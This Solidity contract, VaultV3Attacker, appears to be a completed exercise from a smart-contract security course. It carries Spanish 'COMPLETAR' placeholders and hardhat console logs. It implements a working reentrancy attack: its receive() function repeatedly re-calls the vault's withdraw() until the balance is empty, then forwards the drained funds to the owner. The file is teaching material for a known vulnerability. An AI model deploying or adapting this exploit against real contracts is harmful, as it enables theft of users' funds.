// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IVaultV3 {
    function deposit() external payable;
    function withdraw() external;
}

contract VaultV3Attacker is Ownable {

    IVaultV3 public immutable vault;

    constructor(address vaultContractAddress) {
        vault = IVaultV3(vaultContractAddress);
    }

    function attack() external payable onlyOwner {
        // COMPLETAR
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        // COMPLETAR
        if(address(vault).balance>0) {
            console.log("reentrando");
            console.log(address(vault).balance);
            vault.withdraw();
        } else {
            console.log("ataque terminado");
            payable(owner()).transfer(address(this).balance);
        }
    }
}
